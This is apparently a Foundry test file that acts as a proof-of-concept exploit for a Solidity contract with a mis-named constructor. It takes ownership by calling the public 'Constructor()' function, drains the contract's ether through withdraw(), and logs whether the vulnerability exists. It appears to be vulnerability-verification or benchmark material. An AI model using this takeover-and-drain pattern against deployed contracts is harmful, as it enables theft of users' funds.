// SPDX-License-Identifier: MIT
pragma solidity 0.8.26;
pragma experimental ABIEncoderV2;

import {Test} from "forge-std/Test.sol";
import {console2} from "forge-std/console2.sol";
import "../src/incorrect_constructor_name3.sol";

contract MissingTest is Test {
    Missing public target;
    address public attacker = makeAddr("attacker");
    uint256 public constant INITIAL_BALANCE = 1 ether;

    function setUp() public {
        target = new Missing();
        vm.deal(address(target), INITIAL_BALANCE);
    }

    function test_OwnerTakeoverAndTheft() public {
        // Record initial attacker balance
        uint256 attackerBalanceBefore = attacker.balance;
        
        console2.log("--- BEFORE-Trigger State ---");
        console2.log("Contract balance: %s wei", address(target).balance);
        console2.log("Attacker balance: %s wei", attackerBalanceBefore);
        console2.log("Expected exploit: Steal %s wei", INITIAL_BALANCE);

        // Attempt owner takeover
        console2.log("\n--- Trigger Action: Constructor (ownership takeover) ---");
        vm.startPrank(attacker);
        try target.Constructor() {
            console2.log("Ownership takeover successful");
        } catch (bytes memory reason) {
            vm.stopPrank();
            console2.log("Ownership takeover FAILED with revert reason:");
            console2.logBytes(reason);
            console2.log("Vulnerability not Exist: Failed to gain ownership");
            return;
        }

        // Attempt fund theft
        console2.log("\n--- Trigger Action: Withdraw (fund theft) ---");
        try target.withdraw() {
            vm.stopPrank();
            console2.log("Withdraw succeeded");
        } catch (bytes memory reason) {
            vm.stopPrank();
            console2.log("Withdraw FAILED with revert reason:");
            console2.logBytes(reason);
            console2.log("Vulnerability not Exist: Failed to withdraw funds");
            return;
        }

        // Post-attack state verification
        console2.log("\n--- AFTER-Trigger State ---");
        uint256 contractBalanceAfter = address(target).balance;
        uint256 attackerBalanceAfter = attacker.balance;
        console2.log("Contract balance: %s wei", contractBalanceAfter);
        console2.log("Attacker balance: %s wei", attackerBalanceAfter);
        console2.log("Attacker gains: %s wei", attackerBalanceAfter - attackerBalanceBefore);

        // Final exploitation check
        if (contractBalanceAfter == 0 && attackerBalanceAfter == attackerBalanceBefore + INITIAL_BALANCE) {
            console2.log("\nVulnerability Exists: Successfully took ownership and stole contract funds");
        } else {
            console2.log("\nVulnerability not Exist: Failed to steal funds (contract has %s, attacker balance mismatch)", contractBalanceAfter);
        }
    }
}